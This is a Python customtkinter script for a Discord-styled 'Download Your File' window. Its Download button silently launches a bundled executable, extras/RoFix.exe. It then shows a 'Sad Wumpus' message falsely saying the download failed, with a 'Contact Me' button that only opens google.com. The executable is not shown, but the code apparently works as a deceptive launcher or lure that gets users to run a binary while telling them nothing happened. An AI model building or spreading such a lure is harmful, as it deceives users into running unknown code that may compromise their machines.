import customtkinter as ctk
from PIL import Image
import webbrowser
import os

ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("blue")

app = ctk.CTk()
app.title("Discord Style UI")
app.geometry("400x300")
app.resizable(False, False)

image_path = "extras/wumpus-love.png"
image = ctk.CTkImage(dark_image=Image.open(image_path), size=(100, 100))

image_label = ctk.CTkLabel(master=app, image=image, text="")
image_label.place(relx=0.0, rely=1.0, anchor="sw")

label = ctk.CTkLabel(
    master=app,
    text="Download Your File",
    font=("Roboto", 16)
)
label.place(relx=0.5, rely=0.4, anchor="center")

def on_download():
    file_path = os.path.join(os.getcwd(), "extras", "RoFix.exe")
    os.startfile(file_path)

    new_window = ctk.CTkToplevel(app)
    new_window.title("Sad Wumpus")
    new_window.geometry("400x300")
    new_window.resizable(False, False)

    new_window.attributes("-topmost", True)

    app_x = app.winfo_rootx()
    app_y = app.winfo_rooty()

    new_window.geometry(f"400x300+{app_x}+{app_y}")

    sad_image_path = "extras/sadwumpus.gif"
    sad_image = ctk.CTkImage(dark_image=Image.open(sad_image_path), size=(100, 100))
    sad_image_label = ctk.CTkLabel(master=new_window, image=sad_image, text="")
    sad_image_label.place(relx=0.0, rely=1.0, anchor="sw")

    failure_label = ctk.CTkLabel(
        master=new_window,
        text="Sad Wumpus: Your download failed. Please contact me.",
        font=("Roboto", 16)
    )
    failure_label.place(relx=0.5, rely=0.4, anchor="center")

    def redirect_to_google():
        webbrowser.open("https://www.google.com")

    google_button = ctk.CTkButton(
        master=new_window,
        text="Contact Me",
        command=redirect_to_google,
        font=("Roboto", 16)
    )
    google_button.place(relx=0.5, rely=0.6, anchor="center")

download_button = ctk.CTkButton(
    master=app,
    text="Download",
    command=on_download,
    font=("Roboto", 16)
)
download_button.place(relx=0.5, rely=0.5, anchor="center")

app.mainloop()





